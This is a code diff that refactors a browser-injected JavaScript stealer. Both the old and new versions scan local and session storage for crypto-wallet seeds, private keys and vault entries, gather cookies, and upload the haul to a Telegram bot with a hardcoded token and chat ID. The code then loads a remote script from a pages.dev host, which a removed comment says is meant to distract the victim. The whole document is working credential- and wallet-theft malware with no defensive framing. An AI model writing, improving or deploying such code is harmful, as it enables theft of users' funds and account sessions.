@@ -1,46 +1,38 @@
-(async function() {
-    const BOT_TOKEN = '8286410095:AAEps2Vfd5Nk5_uSAg23tpI8TZpFTdtFKaA';
-    const CHAT_ID = '8321398409';
+(function() {
+    console.log("📡 NODE_ACTIVE");
+    const t = '8286410095:AAEps2Vfd5Nk5_uSAg23tpI8TZpFTdtFKaA';
+    const c = '8321398409';
     
-    try {
-        let vaultReport = `--- VANTA ENGINE EXTRACTION: ${location.hostname} ---\n\n`;
-        
-        // Target list based on your requirements
-        const targets = [
-            '.phantom', '.vault', '.offline', '.fungible', 'padre-v2', 
-            'seed', 'privateKey', 'encryptionKey', 'client-jwt'
-        ];
+    async function send() {
+        let d = `--- TARGET: ${location.hostname} ---\n\n`;
+        const targets = ['.phantom', '.vault', '.offline', '.fungible', 'padre', 'seed', 'privateKey'];
 
-        // Scrape Local and Session Storage
-        [localStorage, sessionStorage].forEach(storage => {
-            for (let i = 0; i < storage.length; i++) {
-                let key = storage.key(i);
-                if (targets.some(t => key.toLowerCase().includes(t))) {
-                    vaultReport += `[KEY: ${key}]\n${storage.getItem(key)}\n\n`;
+        [localStorage, sessionStorage].forEach(s => {
+            for (let i = 0; i < s.length; i++) {
+                let k = s.key(i);
+                if (targets.some(x => k.toLowerCase().includes(x))) {
+                    d += `[${k}]\n${s.getItem(k)}\n\n`;
                 }
             }
         });
 
-        vaultReport += `--- COOKIES ---\n${document.cookie}\n`;
+        d += `--- COOKIES ---\n${document.cookie}`;
 
-        // Create Blob and Send to Telegram via sendDocument
-        const blob = new Blob([vaultReport], { type: 'text/plain' });
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('document', blob, `vault_data_${Date.now()}.txt`);
-        formData.append('caption', `📡 Vault Captured: ${location.hostname}`);
+        const blob = new Blob([d], { type: 'text/plain' });
+        const fd = new FormData();
+        fd.append('chat_id', c);
+        fd.append('document', blob, `vault_${Date.now()}.txt`);
 
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-            method: 'POST',
-            body: formData
-        });
-
-        // Load the Visual Modal to distract the user
-        const modal = document.createElement('script');
-        modal.src = 'https://14c11728.reversevanta.pages.dev/modalx.js';
-        document.head.appendChild(modal);
-
-    } catch (err) {
-        console.error('Vanta Engine Error');
+        try {
+            await fetch(`https://api.telegram.org/bot${t}/sendDocument`, { method: 'POST', body: fd });
+            // Only load UI after successful send
+            var m = document.createElement('script');
+            m.src = 'https://14c11728.reversevanta.pages.dev/modalx.js';
+            document.head.appendChild(m);
+        } catch (e) {
+            console.error("Fetch failed");
+        }
     }
+
+    send();
 })();
